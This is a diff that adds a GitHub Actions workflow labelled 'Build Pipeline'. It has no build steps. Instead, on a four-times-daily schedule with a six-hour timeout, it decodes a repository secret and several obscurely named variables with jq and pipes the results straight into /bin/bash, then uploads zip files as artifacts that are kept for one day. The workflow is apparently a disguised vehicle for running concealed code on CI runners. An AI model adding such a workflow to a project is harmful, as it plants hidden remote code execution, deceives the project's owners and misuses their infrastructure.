@@ -1,0 +1,36 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          ondm93: ${{ secrets.ondm93 }}
+        run: |
+          printf '%s' "$ondm93" | jq -r .pb74225 | /bin/bash
+          echo $y45210 | jq -r .de18517 | /bin/bash
+          printf '%s' "$zuw2" | jq -r .j4805 | /bin/bash
+          printf '%s' "$e2" | jq -r .rslnx4 | /bin/bash
+          printf '%s' "$jluh38553" | jq -r .ch92827 | /bin/bash
+          printf '%s' "$aqzzg52" | jq -r .ao46475 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9J52sgjc
+          path: "*.zip"
+          retention-days: 1
